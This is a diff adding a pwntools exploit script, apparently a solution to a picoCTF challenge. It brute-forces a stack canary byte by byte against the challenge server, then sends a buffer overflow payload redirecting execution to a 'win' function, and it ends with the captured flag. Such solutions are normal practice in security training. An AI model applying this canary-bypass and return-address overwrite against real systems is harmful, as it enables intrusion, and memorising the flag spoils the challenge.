@@ -1,0 +1,41 @@
+from pwn import *
+from string import printable
+
+# brute force the canary (but in smartway, find a single byte of canary each time, dont know why the canary is printable)
+# "throw the brute force into func so return right after success so it wont disturb your terminal"
+
+e = ELF("./vuln")
+win = e.symbols['win']
+
+def test():
+        canary = ""
+        for i in range(4):
+                for char in printable:
+                        p = remote("saturn.picoctf.net", 62128)
+                        #p = process("./vuln")
+                        payload = 'A' * 0x40 + canary + char
+                        p.recvuntil("> ")
+                        p.sendline(str(len(payload)))
+                        p.recvuntil("> ")
+                        p.sendline(payload)
+                        s = p.recvuntil("\n").decode()
+                        p.close()
+                        #p.kill()
+                        if(s == "Ok... Now Where's the Flag?\n"):
+                                canary += char
+                                if(i == 3):
+                                        return canary
+                                break
+
+canary = test()
+print(canary)
+p = remote("saturn.picoctf.net", 62128)
+#p = process("./vuln")
+payload = 'A' * 0x40 + canary
+payload = payload.ljust(0x50).encode() + b'AAAA' + p32(win)
+p.recvuntil("> ")
+p.sendline(str(len(payload)))
+p.recvuntil("> ")
+p.sendline(payload)
+p.interactive()
+#picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}
